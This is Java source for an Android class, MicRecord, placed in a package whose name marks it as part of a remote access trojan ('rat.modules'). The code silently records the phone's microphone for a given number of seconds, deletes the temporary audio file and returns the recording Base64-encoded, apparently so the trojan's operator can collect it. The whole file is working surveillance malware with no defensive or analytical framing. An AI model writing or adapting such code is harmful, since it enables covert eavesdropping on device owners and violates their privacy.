package com.xroomjx.rat.modules;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Base64;

import java.io.File;
import java.io.FileInputStream;

public class MicRecord {
    public static String record(Context context, int seconds) {
        try {
            File output = new File(context.getCacheDir(), "rec.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(output.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(seconds * 1000);
            recorder.stop();
            recorder.release();

            FileInputStream fis = new FileInputStream(output);
            byte[] data = new byte[(int) output.length()];
            fis.read(data);
            fis.close();
            output.delete();
            return Base64.encodeToString(data, Base64.NO_WRAP);
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
